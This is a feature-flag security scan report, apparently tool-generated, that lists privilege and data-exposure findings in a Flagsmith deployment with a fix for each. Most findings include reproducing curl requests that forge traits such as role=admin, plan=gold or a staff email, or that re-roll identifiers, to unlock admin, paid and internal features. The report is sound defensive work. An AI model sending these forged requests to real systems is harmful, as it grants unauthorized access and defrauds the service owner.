# Gatecrasher security report

**3 ways in · 17 findings** · report `r-20261128-144300-6fbe77` · 2026-11-28 14:43 UTC

critical 4 · high 5 · medium 6 · low 2 · info 0

- Target: http://localhost:3030
- Environment: Production
- AI mode: on (claude-sonnet-5-5 via Claude Code)

## Findings by root cause

A root cause is one thing to fix. A way in is a root cause that is exploitable now.

### Root cause: Browsers choose the identifier that unlocks internal_tools

`RC-A2E6FEBF` · CRITICAL · way in · 1 finding

#### [CRITICAL] Anyone can unlock internal tools by picking a staff-style email

`GC-32B2A0B1` · `IDENTIFIER_FORGERY` · subject `internal_tools` · ✗ EXPLOITABLE · detected by flagsmith-engine, live-probe

**What happened.** The internal_tools flag turns on for any identifier matching the staff rule, such as a@acmeshop.dev. An outsider using the public client key can send that identifier and receive the feature. No account trait is involved.

**Why it matters.** The app trusts a self-declared identifier, which anyone can choose. Turning off trait-based checks does not close this gap.

**Business impact.** Unauthorized people could reach internal tooling in Production, risking exposure of internal data and functions.

**Reproduce**

```sh
curl -s -X POST 'http://localhost:8000/api/v1/identities/' -H 'X-Environment-Key: <CLIENT_KEY>' -H 'Content-Type: application/json' -d '{"identifier":"gc-probe-a@acmeshop.dev","traits":[],"transient":true}'
```

<details><summary>Evidence: engine</summary>

Flagsmith's engine serves on instead of off for flag "internal_tools" to any identity whose identifier matches segment "staff_by_identifier", for example "a@acmeshop.dev". No trait is involved.

</details>

<details><summary>Evidence: request</summary>

Request

```
curl -s -X POST 'http://localhost:8000/api/v1/identities/' -H 'X-Environment-Key: <CLIENT_KEY>' -H 'Content-Type: application/json' -d '{"identifier":"gc-probe-a@acmeshop.dev","traits":[],"transient":true}'
```

Response

```
HTTP 200 {"identifier":"gc-probe-a@acmeshop.dev","traits":[],"flags":[{"id":2,"feature":{"id":1,"name":"premium_export","created_date":"2026-11-27T20:39:02.996158Z","description":"Paid feature gated on the plan trait (trait forgery).","initial_value":null,"default_enabled":false,"type":"STANDARD"},"feature_state_value":null,"environment":2,"identity":null,"feature_segment":null,"enabled":false,"reason":"DEFAULT","variant":null},{"id":4,"feature":{"id":2,"name":"admin_panel","created_date":"2026-11-27T20:39:03.247648Z","description":"Admin UI gated on the role trait (privilege escalation).","initial_value":null,"default_enabled":false,"type":"STANDARD"},"feature_state_value":null,"environment":2,"identity":null,"feature_segment":null,"enabled":false,"reason":"DEFAULT","variant":null},{"id":6,"feature":{"id":3,"name":"staff_preview","created_date":"2026-11-27T20:39:03.496434Z","description":"Staff-only preview gated on an email regex.","initial_value":null,"default_enabled":false,"type":"STANDARD"},"feature_state_value":null,"environment":2,"identity":null,"feature_segment":null,"enabled":false,"reason":"DEFAULT","variant":null},{"id":8,"feature":{"id":4,"name":"early_access_ai","created_date":"2026-11-27T20:39:03.731596Z","description":"10 percent canary rollout (identifier re-roll).","initial_value":null,"default_enabled":false,"type":"STANDARD"},"feature_state_value":null,"environment":2,"identity":null,"feature_segment":null,"enabled":false,"reason":"DEFAULT","variant":null},{"id":3…
```

</details>

**Fix:** Stop matching staff access on a client-supplied identifier. Decide staff status on the server and serve the flag from verified data. (plan `plan-73c4ff88`)

### Root cause: Production lets clients set traits

`RC-D41DCAF8` · CRITICAL · closed · 4 findings

#### [CRITICAL] Anyone can switch on the admin panel by claiming to be an admin

`GC-70850605` · `TRAIT_FORGERY` · subject `admins` · ✓ BLOCKED · detected by flagsmith-engine, live-probe

**What happened.** The system decides who is an admin based on a "role" value that the caller supplies themselves. A test request using only the public client key and role=admin flipped the admin_panel flag from off to on in Production.

**Why it matters.** The role is self-declared and never verified, so any outsider can claim it. A security control is relying on information the user can fake.

**Business impact.** Unauthorized people could be shown admin features, risking exposure of sensitive data or actions, and loss of customer trust.

**Reproduce**

```sh
curl -s -X POST 'http://localhost:8000/api/v1/identities/' -H 'X-Environment-Key: <CLIENT_KEY>' -H 'Content-Type: application/json' -d '{"identifier":"gc-probe-80e4da44-ec21-4a43-8021-442804e76d8d","traits":[{"trait_key":"role","trait_value":"admin","transient":true}],"transient":true}'
```

<details><summary>Evidence: engine</summary>

Flagsmith's engine serves on instead of off for flag "admin_panel" to an identity with trait/identifier role="admin" (segment "admins"; forgeable: yes).

</details>

<details><summary>Evidence: request</summary>

Request

```
curl -s -X POST 'http://localhost:8000/api/v1/identities/' -H 'X-Environment-Key: <CLIENT_KEY>' -H 'Content-Type: application/json' -d '{"identifier":"gc-probe-80e4da44-ec21-4a43-8021-442804e76d8d","traits":[{"trait_key":"role","trait_value":"admin","transient":true}],"transient":true}'
```

Response

```
HTTP 200 {"identifier":"gc-probe-80e4da44-ec21-4a43-8021-442804e76d8d","traits":[{"id":null,"trait_key":"role","trait_value":"admin","transient":true}],"flags":[{"id":2,"feature":{"id":1,"name":"premium_export","created_date":"2026-11-27T20:39:02.996158Z","description":"Paid feature gated on the plan trait (trait forgery).","initial_value":null,"default_enabled":false,"type":"STANDARD"},"feature_state_value":null,"environment":2,"identity":null,"feature_segment":null,"enabled":false,"reason":"DEFAULT","variant":null},{"id":30,"feature":{"id":2,"name":"admin_panel","created_date":"2026-11-27T20:39:03.247648Z","description":"Admin UI gated on the role trait (privilege escalation).","initial_value":null,"default_enabled":false,"type":"STANDARD"},"feature_state_value":null,"environment":2,"identity":null,"feature_segment":7,"enabled":true,"reason":"TARGETING_MATCH; segment=admins","variant":null},{"id":6,"feature":{"id":3,"name":"staff_preview","created_date":"2026-11-27T20:39:03.496434Z","description":"Staff-only preview gated on an email regex.","initial_value":null,"default_enabled":false,"type":"STANDARD"},"feature_state_value":null,"environment":2,"identity":null,"feature_segment":null,"enabled":false,"reason":"DEFAULT","variant":null},{"id":8,"feature":{"id":4,"name":"early_access_ai","created_date":"2026-11-27T20:39:03.731596Z","description":"10 percent canary rollout (identifier re-roll).","initial_value":null,"default_enabled":false,"type":"STANDARD"},"feature_state_value":null,"…
```

</details>

<details><summary>Evidence: request</summary>

Request

```
curl -s -X POST 'http://localhost:8000/api/v1/identities/' -H 'X-Environment-Key: <CLIENT_KEY>' -H 'Content-Type: application/json' -d '{"identifier":"gc-probe-a28381e83aee44394d0d370e3dcfb250","traits":[{"trait_key":"role","trait_value":"admin","transient":true}],"transient":true}'
```

Transient SDK evaluation; raw response omitted to protect trait and flag values.

</details>

<details><summary>Evidence: request</summary>

Request

```
curl -s -X POST 'http://localhost:8000/api/v1/identities/' -H 'X-Environment-Key: <CLIENT_KEY>' -H 'Content-Type: application/json' -d '{"identifier":"gc-probe-354e8c4831f43e9f3ee89a095b09b3ca","traits":[{"trait_key":"role","trait_value":"admin","transient":true}],"transient":true}'
```

Transient SDK evaluation; raw response omitted to protect trait and flag values.

</details>

**Fix:** Stop deciding admin access from caller-supplied values. Enforce admin rights on the server using verified identity, and treat the flag as display-only. (plan `plan-3dd892cd`)

#### [CRITICAL] Anyone can unlock staff-only features by typing a staff email

`GC-1A45D85C` · `TRAIT_FORGERY` · subject `staff` · ✓ BLOCKED · detected by flagsmith-engine, live-probe

**What happened.** An outsider can claim to have the email a@acmeshop.dev when requesting flags. The system believes it and switches on the staff_preview feature, which is normally off. The test used only the public client key.

**Why it matters.** The system trusts a self-reported email without verifying it, so the staff segment can be impersonated by anyone.

**Business impact.** Unreleased or internal features in Production could be seen or used by the public, leaking plans and exposing unfinished functionality.

**Reproduce**

```sh
curl -s -X POST 'http://localhost:8000/api/v1/identities/' -H 'X-Environment-Key: <CLIENT_KEY>' -H 'Content-Type: application/json' -d '{"identifier":"gc-probe-2a9ed5dd-281f-40c2-bed7-0ebb53e448b9","traits":[{"trait_key":"email","trait_value":"a@acmeshop.dev","transient":true}],"transient":true}'
```

<details><summary>Evidence: engine</summary>

Flagsmith's engine serves on instead of off for flag "staff_preview" to an identity with trait/identifier email="a@acmeshop.dev" (segment "staff"; forgeable: yes).

</details>

<details><summary>Evidence: request</summary>

Request

```
curl -s -X POST 'http://localhost:8000/api/v1/identities/' -H 'X-Environment-Key: <CLIENT_KEY>' -H 'Content-Type: application/json' -d '{"identifier":"gc-probe-2a9ed5dd-281f-40c2-bed7-0ebb53e448b9","traits":[{"trait_key":"email","trait_value":"a@acmeshop.dev","transient":true}],"transient":true}'
```

Response

```
HTTP 200 {"identifier":"gc-probe-2a9ed5dd-281f-40c2-bed7-0ebb53e448b9","traits":[{"id":null,"trait_key":"email","trait_value":"a@acmeshop.dev","transient":true}],"flags":[{"id":2,"feature":{"id":1,"name":"premium_export","created_date":"2026-11-27T20:39:02.996158Z","description":"Paid feature gated on the plan trait (trait forgery).","initial_value":null,"default_enabled":false,"type":"STANDARD"},"feature_state_value":null,"environment":2,"identity":null,"feature_segment":null,"enabled":false,"reason":"DEFAULT","variant":null},{"id":4,"feature":{"id":2,"name":"admin_panel","created_date":"2026-11-27T20:39:03.247648Z","description":"Admin UI gated on the role trait (privilege escalation).","initial_value":null,"default_enabled":false,"type":"STANDARD"},"feature_state_value":null,"environment":2,"identity":null,"feature_segment":null,"enabled":false,"reason":"DEFAULT","variant":null},{"id":31,"feature":{"id":3,"name":"staff_preview","created_date":"2026-11-27T20:39:03.496434Z","description":"Staff-only preview gated on an email regex.","initial_value":null,"default_enabled":false,"type":"STANDARD"},"feature_state_value":null,"environment":2,"identity":null,"feature_segment":8,"enabled":true,"reason":"TARGETING_MATCH; segment=staff","variant":null},{"id":8,"feature":{"id":4,"name":"early_access_ai","created_date":"2026-11-27T20:39:03.731596Z","description":"10 percent canary rollout (identifier re-roll).","initial_value":null,"default_enabled":false,"type":"STANDARD"},"feature_state_valu…
```

</details>

**Fix:** Stop using client-supplied traits like email to grant staff access. Decide staff targeting on the server from verified identity, or use signed identities. (plan `plan-3dd892cd`)

#### [HIGH] Anyone can self-grant the gold plan and unlock premium export

`GC-688647D2` · `TRAIT_FORGERY` · subject `gold_plan` · ✓ BLOCKED · detected by flagsmith-engine, live-probe

**What happened.** Using only the public client key, an outsider sent a request claiming their plan was "gold". The system accepted it and switched the premium_export feature on, with no proof of payment or account.

**Why it matters.** The plan level is taken from what the caller says about themselves, so it can't be trusted to gate a paid feature.

**Business impact.** Non-paying users can get premium features free, which means lost subscription revenue and weaker incentive to upgrade.

**Reproduce**

```sh
curl -s -X POST 'http://localhost:8000/api/v1/identities/' -H 'X-Environment-Key: <CLIENT_KEY>' -H 'Content-Type: application/json' -d '{"identifier":"gc-probe-82a65258-c768-4f26-b93d-989867184be5","traits":[{"trait_key":"plan","trait_value":"gold","transient":true}],"transient":true}'
```

<details><summary>Evidence: engine</summary>

Flagsmith's engine serves on instead of off for flag "premium_export" to an identity with trait/identifier plan="gold" (segment "gold_plan"; forgeable: yes).

</details>

<details><summary>Evidence: request</summary>

Request

```
curl -s -X POST 'http://localhost:8000/api/v1/identities/' -H 'X-Environment-Key: <CLIENT_KEY>' -H 'Content-Type: application/json' -d '{"identifier":"gc-probe-82a65258-c768-4f26-b93d-989867184be5","traits":[{"trait_key":"plan","trait_value":"gold","transient":true}],"transient":true}'
```

Response

```
HTTP 200 {"identifier":"gc-probe-82a65258-c768-4f26-b93d-989867184be5","traits":[{"id":null,"trait_key":"plan","trait_value":"gold","transient":true}],"flags":[{"id":29,"feature":{"id":1,"name":"premium_export","created_date":"2026-11-27T20:39:02.996158Z","description":"Paid feature gated on the plan trait (trait forgery).","initial_value":null,"default_enabled":false,"type":"STANDARD"},"feature_state_value":null,"environment":2,"identity":null,"feature_segment":6,"enabled":true,"reason":"TARGETING_MATCH; segment=gold_plan","variant":null},{"id":4,"feature":{"id":2,"name":"admin_panel","created_date":"2026-11-27T20:39:03.247648Z","description":"Admin UI gated on the role trait (privilege escalation).","initial_value":null,"default_enabled":false,"type":"STANDARD"},"feature_state_value":null,"environment":2,"identity":null,"feature_segment":null,"enabled":false,"reason":"DEFAULT","variant":null},{"id":6,"feature":{"id":3,"name":"staff_preview","created_date":"2026-11-27T20:39:03.496434Z","description":"Staff-only preview gated on an email regex.","initial_value":null,"default_enabled":false,"type":"STANDARD"},"feature_state_value":null,"environment":2,"identity":null,"feature_segment":null,"enabled":false,"reason":"DEFAULT","variant":null},{"id":8,"feature":{"id":4,"name":"early_access_ai","created_date":"2026-11-27T20:39:03.731596Z","description":"10 percent canary rollout (identifier re-roll).","initial_value":null,"default_enabled":false,"type":"STANDARD"},"feature_state_value":null…
```

</details>

**Fix:** Decide plan-based access on the server from verified billing data, not client-supplied traits. Don't let client keys set traits used by segments. (plan `plan-3dd892cd`)

#### [MEDIUM] Visitors can fake their own user traits in Production

`GC-A60CCA1A` · `SETTING_CLIENT_TRAITS_ON` · subject `allow_client_traits` · ✓ BLOCKED · detected by admin-settings

**What happened.** In Production, the setting that lets client SDKs set user traits is ON. Anyone with the public client key can assign themselves any traits they like.

**Why it matters.** Segments that decide who gets a feature based on a trait can be forged, so access rules can't be trusted.

**Business impact.** Outsiders could unlock features, beta access, or paid tiers they shouldn't have. That risks lost revenue and exposure of restricted functionality.

<details><summary>Evidence: setting</summary>

Environment "Production": dashboard setting "Allow client SDKs to set user traits" is ON (allow_client_traits). Anyone holding the public client key can set their own traits, so any segment keyed on a trait can be forged. Turn this setting off for every environment that uses segments for access control.

</details>

**Fix:** Turn off "Allow client SDKs to set user traits" in every environment that uses segments for access control. Set traits from your trusted server instead. (plan `plan-3dd892cd`)

### Root cause: payment_config is served to browsers and contains a live secret

`RC-C11B4554` · CRITICAL · closed · 2 findings

#### [CRITICAL] Payment secret exposed in a public feature flag

`GC-8B6A1273` · `SECRET_IN_CLIENT_VALUE` · subject `payment_config` · ✓ BLOCKED · detected by deterministic

**What happened.** Using only the public client key, anyone can fetch the payment_config flag in Production. Its value includes a live payment provider API secret (acmepay) and a webhook address.

**Why it matters.** Client keys are meant to be visible in apps and browsers. Secrets stored in flag values are therefore readable by anyone.

**Business impact.** Attackers could use the key to act on your payment account, causing fraud, financial loss, and customer data exposure.

**Reproduce**

```sh
curl -s 'http://localhost:8000/api/v1/flags/' -H 'X-Environment-Key: <CLIENT_KEY>'
```

<details><summary>Evidence: request</summary>

Request

```
curl -s 'http://localhost:8000/api/v1/flags/' -H 'X-Environment-Key: <CLIENT_KEY>'
```

Response

```
payment_config = {"provider":"acmepay","api_secret":"[SECRET len=42 prefix=acme…]","webhook":"ht… (126 bytes)
```

secret detected in value at $.api_secret (acme_live_key)

</details>

**Fix:** Revoke and replace the exposed secret now, move it to a server-side secrets store, and keep only non-sensitive settings in client-visible flags. (plan `plan-1a43203e`)

#### [HIGH] Secret payment flag is exposed to apps and browsers

`GC-0B5C5F67` · `FLAG_NOT_SERVER_ONLY` · subject `payment_config` · ✓ BLOCKED · detected by admin-settings

**What happened.** The production flag "payment_config" is classified as secret, but its "Server-side only" setting is off. Because of that, client SDKs receive it, so anyone using the app or SDK key could potentially read it.

**Why it matters.** Secret settings should only reach your servers. Sending this one to client-side code puts it where outsiders can view it.

**Business impact.** Payment configuration details could leak, helping attackers target your checkout, enabling fraud, or creating compliance concerns.

<details><summary>Evidence: setting</summary>

Feature "payment_config" is classified SECRET but the dashboard setting "Server-side only" is off, so client SDKs receive it.

</details>

**Fix:** Turn on "Server-side only" for payment_config in the production dashboard. Then review whether its contents were exposed and rotate anything sensitive. (plan `plan-1a43203e`)

### Root cause: Browsers choose the identifier that decides their group in the pricing_page experiment

`RC-D72363A6` · HIGH · way in · 1 finding

#### [HIGH] Visitors can choose their own price in the pricing test

`GC-DED120AC` · `EXPERIMENT_RIGGING` · subject `pricing_page` · ✗ EXPLOITABLE · detected by flagsmith-engine, live-probe

**What happened.** Anyone using the public client key can request the pricing page flag with any identifier they like. By trying different identifiers, they can keep going until they land in the cheaper "price_low" group instead of "price_high". About half of attempts succeed.

**Why it matters.** The experiment assumes users are assigned randomly. Self-selection breaks that, so results become unreliable.

**Business impact.** Customers can get lower prices than intended, reducing revenue, and the test may lead to a wrong pricing decision.

**Reproduce**

```sh
curl -s -X POST 'http://localhost:8000/api/v1/identities/' -H 'X-Environment-Key: <CLIENT_KEY>' -H 'Content-Type: application/json' -d '{"identifier":"gc-probe-map-0","traits":[],"transient":true}'
```

<details><summary>Evidence: engine</summary>

Variant spread over 1000 identifiers: map[price_high:489 price_low:511]

</details>

<details><summary>Evidence: request</summary>

Request

```
curl -s -X POST 'http://localhost:8000/api/v1/identities/' -H 'X-Environment-Key: <CLIENT_KEY>' -H 'Content-Type: application/json' -d '{"identifier":"gc-probe-map-0","traits":[],"transient":true}'
```

Response

```
HTTP 200 {"identifier":"gc-probe-map-0","traits":[],"flags":[{"id":2,"feature":{"id":1,"name":"premium_export","created_date":"2026-11-27T20:39:02.996158Z","description":"Paid feature gated on the plan trait (trait forgery).","initial_value":null,"default_enabled":false,"type":"STANDARD"},"feature_state_value":null,"environment":2,"identity":null,"feature_segment":null,"enabled":false,"reason":"DEFAULT","variant":null},{"id":4,"feature":{"id":2,"name":"admin_panel","created_date":"2026-11-27T20:39:03.247648Z","description":"Admin UI gated on the role trait (privilege escalation).","initial_value":null,"default_enabled":false,"type":"STANDARD"},"feature_state_value":null,"environment":2,"identity":null,"feature_segment":null,"enabled":false,"reason":"DEFAULT","variant":null},{"id":6,"feature":{"id":3,"name":"staff_preview","created_date":"2026-11-27T20:39:03.496434Z","description":"Staff-only preview gated on an email regex.","initial_value":null,"default_enabled":false,"type":"STANDARD"},"feature_state_value":null,"environment":2,"identity":null,"feature_segment":null,"enabled":false,"reason":"DEFAULT","variant":null},{"id":8,"feature":{"id":4,"name":"early_access_ai","created_date":"2026-11-27T20:39:03.731596Z","description":"10 percent canary rollout (identifier re-roll).","initial_value":null,"default_enabled":false,"type":"STANDARD"},"feature_state_value":null,"environment":2,"identity":null,"feature_segment":null,"enabled":false,"reason":"DEFAULT","variant":null},{"id":33,"featur…
```

</details>

<details><summary>Evidence: request</summary>

Request

```
curl -s -X POST 'http://localhost:8000/api/v1/identities/' -H 'X-Environment-Key: <CLIENT_KEY>' -H 'Content-Type: application/json' -d '{"identifier":"gc-probe-bc844f6ca5a945bc8b447de60e4cc2fe","traits":[],"transient":true}'
```

Transient SDK evaluation; raw response omitted to protect trait and flag values.

</details>

**Fix:** Assign experiment groups on the server using a trusted user ID, not an identifier the visitor supplies, and don't expose assignment control to clients. (plan `plan-9406347d`)

### Root cause: Production returns stored identity data to anyone holding the client key

`RC-0D1B0E5B` · HIGH · closed · 4 findings

#### [HIGH] Customer traits readable with the public client key

`GC-914405C1` · `IDENTITY_TRAIT_LEAK` · subject `ce***@acmeshop.dev` · ✓ BLOCKED · detected by live-probe, admin-settings

**What happened.** Anyone holding the public client key, which ships inside the app, can request a customer's stored traits by supplying their identifier. In production, one test identity returned 3 traits. Gatecrasher did not read the values.

**Why it matters.** The "Hide sensitive data" setting is off, so the traits are served to anyone who asks. They are classed as personal information, and the client key is not a secret.

**Business impact.** Customer personal data could be harvested, creating privacy-law exposure, breach-notification duties, and loss of customer trust.

**Reproduce**

```sh
curl -s 'http://localhost:8000/api/v1/identities/?identifier=<TEST_IDENTITY>' -H 'X-Environment-Key: <CLIENT_KEY>'
```

<details><summary>Evidence: request</summary>

Request

```
curl -s 'http://localhost:8000/api/v1/identities/?identifier=<TEST_IDENTITY>' -H 'X-Environment-Key: <CLIENT_KEY>'
```

Response

```
3 traits exposed; all values [MASKED]
```

</details>

<details><summary>Evidence: setting</summary>

Identity stores 3 trait(s); "Hide sensitive data" is off, so GET identities/?identifier= returns them. Trait values are not read by Gatecrasher.

</details>

**Fix:** Turn on "Hide sensitive data" for the production environment so traits are no longer returned. Remove personal data from traits that don't need to be there. (plan `plan-3dd892cd`)

#### [HIGH] User profile data readable with a public key

`GC-1305BD20` · `IDENTITY_TRAIT_LEAK` · subject `qa***@acmeshop.dev` · ✓ BLOCKED · detected by live-probe

**What happened.** Anyone holding the public client key, which ships inside the app, can request a user's stored profile traits from the production service. The test showed one trait returned for a QA account. Its value was masked in the evidence.

**Why it matters.** The public key is meant to be visible to everyone, so it should not unlock personal data. Anyone could look up users by identifier.

**Business impact.** Customer personal data could be exposed, risking privacy complaints, regulatory penalties, and lost customer trust.

**Reproduce**

```sh
curl -s 'http://localhost:8000/api/v1/identities/?identifier=<TEST_IDENTITY>' -H 'X-Environment-Key: <CLIENT_KEY>'
```

<details><summary>Evidence: request</summary>

Request

```
curl -s 'http://localhost:8000/api/v1/identities/?identifier=<TEST_IDENTITY>' -H 'X-Environment-Key: <CLIENT_KEY>'
```

Response

```
1 traits exposed; all values [MASKED]
```

</details>

**Fix:** Stop returning identity traits to public client keys, or require a server-side secret key. Then review which traits are stored. (plan `plan-3dd892cd`)

#### [MEDIUM] Beta dashboard override readable by anyone with the identifier

`GC-58B8A822` · `IDENTITY_OVERRIDE_LEAK` · subject `beta_dashboard` · ✓ BLOCKED · detected by flagsmith-engine, admin-settings, live-probe

**What happened.** Anyone who knows a user's identifier and the public client key can request that user's settings and see that a custom override turns beta_dashboard on instead of off.

**Why it matters.** The "Hide sensitive data" setting is off in Production, so per-user override data is exposed to outsiders.

**Business impact.** Unreleased features and the users chosen for them can be discovered early. Evidence shows only a low-risk feature flag, so impact is limited.

**Reproduce**

```sh
curl -s 'http://localhost:8000/api/v1/identities/?identifier=<TEST_IDENTITY>' -H 'X-Environment-Key: <CLIENT_KEY>'
```

<details><summary>Evidence: engine</summary>

Identity override present in the environment document while "Hide sensitive data" is off.

</details>

<details><summary>Evidence: request</summary>

Request

```
curl -s 'http://localhost:8000/api/v1/identities/?identifier=<TEST_IDENTITY>' -H 'X-Environment-Key: <CLIENT_KEY>'
```

Response

```
Identity override differs from baseline; values [MASKED]
```

</details>

**Fix:** Turn on "Hide sensitive data" for the Production environment so identity overrides are no longer returned to clients. (plan `plan-3dd892cd`)

#### [MEDIUM] Production feature flag data is not hidden

`GC-9FE52BC7` · `SETTING_SENSITIVE_DATA_VISIBLE` · subject `hide_sensitive_data` · ✓ BLOCKED · detected by admin-settings

**What happened.** The 'Hide sensitive data' setting is turned off in the Production environment. This means sensitive values tied to your feature flags are not masked. The evidence shows only the setting state, not whether anyone has actually viewed or taken data.

**Why it matters.** With masking off, anyone who can reach the flag data in Production may see values that should stay private, such as keys or user details. It removes a safety layer.

**Business impact.** Sensitive customer or system information could be exposed, risking privacy complaints, loss of customer trust, and possible compliance problems.

<details><summary>Evidence: setting</summary>

Environment "Production": dashboard setting "Hide sensitive data" is OFF (hide_sensitive_data). Sensitive data is not hidden in this environment. Turn this setting on.

</details>

**Fix:** Turn on 'Hide sensitive data' for the Production environment in the dashboard settings, then confirm the setting is saved. (plan `plan-3dd892cd`)

### Root cause: Browsers choose the identifier that decides early_access_ai

`RC-1C4189EB` · MEDIUM · way in · 1 finding

#### [MEDIUM] Anyone can unlock the early AI feature by changing their ID

`GC-B626FA94` · `PERCENTAGE_REROLL` · subject `early_access_ai` · ✗ EXPLOITABLE · detected by flagsmith-engine, live-probe

**What happened.** The early_access_ai flag is meant for a 10% canary group. Because users choose their own identifier, an outsider can try new IDs until one lands in the group. About 9% succeed, so roughly 11 tries are enough, and the flag turns on.

**Why it matters.** The percentage rollout trusts an identifier the caller controls, so it is not a real access control.

**Business impact.** Unreleased AI functionality could be seen or used by people who weren't chosen, undermining staged rollouts, risking unfinished features, and skewing canary results.

**Reproduce**

```sh
curl -s -X POST 'http://localhost:8000/api/v1/identities/' -H 'X-Environment-Key: <CLIENT_KEY>' -H 'Content-Type: application/json' -d '{"identifier":"gc-probe-map-5","traits":[],"transient":true}'
```

<details><summary>Evidence: engine</summary>

Flagsmith's engine serves on instead of off for flag "early_access_ai" to an identity with trait/identifier identifier="gc-probe-map-5" (segment "canary_10"; forgeable: yes).

</details>

<details><summary>Evidence: request</summary>

Request

```
curl -s -X POST 'http://localhost:8000/api/v1/identities/' -H 'X-Environment-Key: <CLIENT_KEY>' -H 'Content-Type: application/json' -d '{"identifier":"gc-probe-map-5","traits":[],"transient":true}'
```

Response

```
HTTP 200 {"identifier":"gc-probe-map-5","traits":[],"flags":[{"id":2,"feature":{"id":1,"name":"premium_export","created_date":"2026-11-27T20:39:02.996158Z","description":"Paid feature gated on the plan trait (trait forgery).","initial_value":null,"default_enabled":false,"type":"STANDARD"},"feature_state_value":null,"environment":2,"identity":null,"feature_segment":null,"enabled":false,"reason":"DEFAULT","variant":null},{"id":4,"feature":{"id":2,"name":"admin_panel","created_date":"2026-11-27T20:39:03.247648Z","description":"Admin UI gated on the role trait (privilege escalation).","initial_value":null,"default_enabled":false,"type":"STANDARD"},"feature_state_value":null,"environment":2,"identity":null,"feature_segment":null,"enabled":false,"reason":"DEFAULT","variant":null},{"id":6,"feature":{"id":3,"name":"staff_preview","created_date":"2026-11-27T20:39:03.496434Z","description":"Staff-only preview gated on an email regex.","initial_value":null,"default_enabled":false,"type":"STANDARD"},"feature_state_value":null,"environment":2,"identity":null,"feature_segment":null,"enabled":false,"reason":"DEFAULT","variant":null},{"id":32,"feature":{"id":4,"name":"early_access_ai","created_date":"2026-11-27T20:39:03.731596Z","description":"10 percent canary rollout (identifier re-roll).","initial_value":null,"default_enabled":false,"type":"STANDARD"},"feature_state_value":null,"environment":2,"identity":null,"feature_segment":9,"enabled":true,"reason":"TARGETING_MATCH; segment=canary_10","variant…
```

</details>

<details><summary>Evidence: request</summary>

Request

```
curl -s -X POST 'http://localhost:8000/api/v1/identities/' -H 'X-Environment-Key: <CLIENT_KEY>' -H 'Content-Type: application/json' -d '{"identifier":"gc-probe-a8071bd628589b4a17a9e59a7554c044","traits":[],"transient":true}'
```

Transient SDK evaluation; raw response omitted to protect trait and flag values.

</details>

**Fix:** Don't rely on client-chosen identifiers to gate unreleased features. Use server-assigned or authenticated IDs, and keep sensitive flags off the client-side key. (plan `plan-a3e4bb3e`)

### Root cause: internal_api_url is served to browsers and contains an internal URL

`RC-E570099E` · MEDIUM · closed · 2 findings

#### [MEDIUM] Internal admin address exposed to every browser

`GC-63E8DE85` · `INTERNAL_URL_LEAK` · subject `internal_api_url` · ✓ BLOCKED · detected by deterministic

**What happened.** Anyone holding the public client key can request the flag list and see a flag named internal_api_url. Its value points to a private network address for an admin interface.

**Why it matters.** The value is meant for internal use only, yet it is sent to every visitor. It reveals how the internal network is laid out and where an admin service lives.

**Business impact.** Attackers gain a map for targeting your admin systems, making later attacks easier. It also signals weak separation between public and private configuration, which can worry customers and auditors.

**Reproduce**

```sh
curl -s 'http://localhost:8000/api/v1/flags/' -H 'X-Environment-Key: <CLIENT_KEY>'
```

<details><summary>Evidence: request</summary>

Request

```
curl -s 'http://localhost:8000/api/v1/flags/' -H 'X-Environment-Key: <CLIENT_KEY>'
```

Response

```
internal_api_url = http://10.0.3.7:8080/admin (26 bytes)
```

internal url detected in value at $ (private_ip)

</details>

**Fix:** Remove this flag from the client-facing environment and keep internal addresses in server-side configuration only. Then review other flags for similar internal values. (plan `plan-600c3dc6`)

#### [LOW] Internal API address exposed to client apps

`GC-03878136` · `FLAG_NOT_SERVER_ONLY` · subject `internal_api_url` · ✓ BLOCKED · detected by admin-settings

**What happened.** The production flag "internal_api_url" is not marked "Server-side only", so client SDKs receive it. Anyone using the app or SDK can potentially see this internal address.

**Why it matters.** Internal URLs are meant to stay private. Revealing one tells outsiders where internal systems live, which helps them plan attacks. The evidence doesn't show the address itself is reachable from outside.

**Business impact.** Low severity, but it leaks infrastructure details and could make targeted probing of internal services easier.

<details><summary>Evidence: setting</summary>

Feature "internal_api_url" is classified INTERNAL_URL but the dashboard setting "Server-side only" is off, so client SDKs receive it.

</details>

**Fix:** Turn on "Server-side only" for this flag in the production dashboard so client SDKs stop receiving it. Consider whether the address needs to be changed if it was sensitive. (plan `plan-600c3dc6`)

### Root cause: project_nightjar_launch_2026_12_15 is served to browsers and contains an unreleased product name

`RC-F2DE0CCF` · MEDIUM · closed · 2 findings

#### [MEDIUM] Secret product launch name visible in public flag list

`GC-07590992` · `UNRELEASED_PRODUCT_LEAK` · subject `project_nightjar_launch_2026_12_15` · ✓ BLOCKED · detected by deterministic

**What happened.** Anyone holding the client key, which ships inside the app, can request the flag list and see a flag named project_nightjar_launch_2026_12_15. The name reveals a codename and a planned launch date of December 15, 2026. Only the name is exposed; its value was empty.

**Why it matters.** Flag names are readable by outsiders, so internal plans placed in them become public before the announcement.

**Business impact.** Competitors, press, or investors could learn about the unreleased product and its timing, weakening launch surprise and giving rivals time to respond.

**Reproduce**

```sh
curl -s 'http://localhost:8000/api/v1/flags/' -H 'X-Environment-Key: <CLIENT_KEY>'
```

<details><summary>Evidence: request</summary>

Request

```
curl -s 'http://localhost:8000/api/v1/flags/' -H 'X-Environment-Key: <CLIENT_KEY>'
```

Response

```
project_nightjar_launch_2026_12_15 =  (0 bytes)
```

unreleased product detected in flag name (codename_launch)

</details>

**Fix:** Rename the flag to a neutral name with no codename or date, and keep a private mapping internally. Establish a naming rule for future flags. (plan `plan-83421890`)

#### [LOW] Unreleased product flag is visible to client apps

`GC-64038665` · `FLAG_NOT_SERVER_ONLY` · subject `project_nightjar_launch_2026_12_15` · ✓ BLOCKED · detected by admin-settings

**What happened.** The flag named for an unreleased product launch is not set to "Server-side only" in Production, so client SDKs receive it. Anyone inspecting the app's flag data could see the flag's name.

**Why it matters.** The flag name reveals a project codename and a planned launch date. Sensitive flags should stay on servers, out of public reach.

**Business impact.** Competitors or press could learn about the confidential launch plans early, weakening the announcement and the company's competitive timing.

<details><summary>Evidence: setting</summary>

Feature "project_nightjar_launch_2026_12_15" is classified UNRELEASED_PRODUCT but the dashboard setting "Server-side only" is off, so client SDKs receive it.

</details>

**Fix:** Turn on "Server-side only" for this flag in Production. Consider renaming it to something neutral that doesn't reveal the project or date. (plan `plan-83421890`)

## Environment security settings

| Environment | Client traits | Sensitive data hidden | Server-only flags | Client-visible flags |
|---|---|---|---|---|
